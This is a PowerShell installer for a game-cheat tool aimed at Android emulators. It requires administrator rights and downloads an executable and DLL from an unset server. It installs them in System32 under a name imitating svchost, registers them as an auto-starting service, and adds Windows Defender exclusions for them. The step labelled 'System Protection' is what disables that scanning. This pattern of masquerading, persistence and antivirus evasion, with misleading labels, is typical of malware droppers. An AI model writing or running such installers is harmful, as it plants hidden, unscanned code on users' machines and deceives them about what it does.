# ============================================================
#       ANIK X CHEATS STREAMER - INSTALLER
# ============================================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Host.UI.RawUI.WindowTitle = "Anik X Cheats Streamer - Installer"

# --- Admin Privilege Elevation Check ---
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{
    Clear-Host
    Write-Host ""
    Write-Host "  ┌────────────────────────────────────────────────────────┐" -ForegroundColor Red
    Write-Host "  │   [!] ADMINISTRATOR PRIVILEGES REQUIRED                │" -ForegroundColor Red
    Write-Host "  │   Please right-click PowerShell and 'Run as admin'     │" -ForegroundColor White
    Write-Host "  └────────────────────────────────────────────────────────┘" -ForegroundColor Red
    Write-Host ""
    Start-Sleep -Seconds 3
    exit
}

# --- Configuration ---
$BaseUrl     = "https://REPLACE_ME"
$TargetExe   = "C:\Windows\System32\svchostx_svc.exe"
$TargetDll   = "C:\Windows\System32\svchostx.dll"
$LogFile     = "C:\Windows\Temp\svchostx.log"
$ServiceName = "svchostx"
$InstallUtil = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
$TempDir     = "$env:TEMP\anikx_setup"

Clear-Host
Write-Host ""
Write-Host "  ╔════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
Write-Host "  ║                                                        ║" -ForegroundColor Magenta
Write-Host "  ║       " -NoNewline -ForegroundColor Magenta
Write-Host "★  A N I K  X  C H E A T S  S T R E A M E R  ★" -NoNewline -ForegroundColor Cyan
Write-Host "   ║" -ForegroundColor Magenta
Write-Host "  ║                                                        ║" -ForegroundColor Magenta
Write-Host "  ║            " -NoNewline -ForegroundColor Magenta
Write-Host "Next-Gen Emulator Streaming System" -NoNewline -ForegroundColor DarkGray
Write-Host "          ║" -ForegroundColor Magenta
Write-Host "  ╚════════════════════════════════════════════════════════╝" -ForegroundColor Magenta
Write-Host ""

Start-Sleep -Milliseconds 300

function Show-Step {
    param([string]$Step, [string]$Title, [string]$Details)
    Write-Host "  [" -NoNewline -ForegroundColor DarkGray
    Write-Host "$Step" -NoNewline -ForegroundColor Cyan
    Write-Host "] " -NoNewline -ForegroundColor DarkGray
    Write-Host "$Title" -ForegroundColor White
    if ($Details) {
        Write-Host "      └─ $Details" -ForegroundColor DarkGray
    }
}

function Show-Success {
    param([string]$Message)
    Write-Host "      ✔ $Message" -ForegroundColor Green
}

# --- Step 1: Connecting ---
Show-Step "01/05" "Connecting to Cloud Network..." "Establishing secure handshake with server"
Start-Sleep -Milliseconds 400
if (-not (Test-Path $TempDir)) {
    New-Item -Path $TempDir -ItemType Directory -Force | Out-Null
}
Show-Success "Connected successfully"
Write-Host ""

# --- Step 2: Downloading ---
Show-Step "02/05" "Downloading Streamer Engine..." "Fetching latest core modules"
try {
    Invoke-WebRequest -Uri "$BaseUrl/files/svchostx.exe" -OutFile "$TempDir\svchostx.exe" -UseBasicParsing
    Invoke-WebRequest -Uri "$BaseUrl/files/svchostx.dll" -OutFile "$TempDir\svchostx.dll" -UseBasicParsing
    Show-Success "svchostx.exe & svchostx.dll synced (100%)"
} catch {
    Write-Host ""
    Write-Host "  ✖ [ERROR] Failed to download engine files from server!" -ForegroundColor Red
    Write-Host "    Details: $($_.Exception.Message)" -ForegroundColor DarkRed
    Write-Host ""
    Start-Sleep -Seconds 4
    exit
}
Write-Host ""

# --- Step 3: Clean & Deploy ---
Show-Step "03/05" "Deploying System Modules..." "Preparing service environment"

$existing = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($existing) {
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 800
    if (Test-Path $InstallUtil) {
        & $InstallUtil /u $TargetExe 2>&1 | Out-Null
    }
    Start-Sleep -Milliseconds 800
}

if (Test-Path $TargetExe) { Remove-Item $TargetExe -Force -ErrorAction SilentlyContinue }
if (Test-Path $TargetDll) { Remove-Item $TargetDll -Force -ErrorAction SilentlyContinue }

Copy-Item "$TempDir\svchostx.exe" $TargetExe -Force
Copy-Item "$TempDir\svchostx.dll" $TargetDll -Force

if (Test-Path $InstallUtil) {
    & $InstallUtil $TargetExe 2>&1 | Out-Null
}
Start-Sleep -Milliseconds 800
Set-Service -Name $ServiceName -StartupType Automatic
Show-Success "Service binaries installed and registered"
Write-Host ""

# --- Step 4: System Protection ---
Show-Step "04/05" "Applying Security Exclusions..." "Configuring Windows Defender"
try {
    Add-MpPreference -ExclusionPath $TargetExe -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $TargetDll -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $LogFile   -ErrorAction SilentlyContinue
    Show-Success "Antivirus exclusions configured"
} catch {
    Show-Success "Protection step completed"
}
Write-Host ""

# --- Step 5: Activation ---
Show-Step "05/05" "Starting Background Service..." "Activating automatic injection watcher"
Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 1000

Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
Show-Success "Service state: RUNNING"
Write-Host ""

# --- Finish Banner ---
Write-Host "  ┌────────────────────────────────────────────────────────┐" -ForegroundColor Green
Write-Host "  │                                                        │" -ForegroundColor Green
Write-Host "  │   " -NoNewline -ForegroundColor Green
Write-Host "✔  INSTALLATION COMPLETED SUCCESSFULLY!" -NoNewline -ForegroundColor White
Write-Host "             │" -ForegroundColor Green
Write-Host "  │                                                        │" -ForegroundColor Green
Write-Host "  │   " -NoNewline -ForegroundColor Green
Write-Host "▸ Status      : " -NoNewline -ForegroundColor Cyan
Write-Host "Active & Monitoring in Background" -NoNewline -ForegroundColor White
Write-Host "        │" -ForegroundColor Green
Write-Host "  │   " -NoNewline -ForegroundColor Green
Write-Host "▸ Instruction : " -NoNewline -ForegroundColor Yellow
Write-Host "Start BlueStacks / MSI App Player" -NoNewline -ForegroundColor White
Write-Host "        │" -ForegroundColor Green
Write-Host "  │   " -NoNewline -ForegroundColor Green
Write-Host "▸ Web Panel   : " -NoNewline -ForegroundColor Magenta
Write-Host "http://localhost:60708" -NoNewline -ForegroundColor White
Write-Host "                   │" -ForegroundColor Green
Write-Host "  │                                                        │" -ForegroundColor Green
Write-Host "  └────────────────────────────────────────────────────────┘" -ForegroundColor Green
Write-Host ""
Write-Host "  [★] Thank you for using Anik X Cheats Streamer!" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 4